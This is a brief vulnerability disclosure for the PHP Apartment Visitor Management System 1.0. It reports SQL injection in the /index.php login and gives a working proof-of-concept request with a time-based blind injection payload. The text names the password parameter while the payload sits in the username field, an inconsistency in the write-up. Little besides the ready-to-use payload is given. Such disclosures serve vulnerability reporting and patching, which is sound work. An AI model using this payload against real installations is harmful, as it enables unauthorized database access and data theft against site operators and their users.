# Apartment Visitor Management System-SQL injections

### Date: 

> ### 2022-08/06



### Exploit Author:

> ### anx0ing@gmail.com



### Vendor Homepage: 

> [https://www.sourcecodester.com](https://www.sourcecodester.com/)



### Software Link: 

> https://www.sourcecodester.com/php-apartment-visitor-management-system-source-code



### Version: 

> ### 1.0



### /index.php

`password`Parameters have SQL injections

> POC

```
login=&password=admin123&username=' AND (SELECT 4955 FROM (SELECT(SLEEP(5)))RSzF) AND 'htiy'='htiy
```

![image-20220806001643822](https://cdn.jsdelivr.net/gh/beytagh001/blog-img/image-20220806001643822.png)
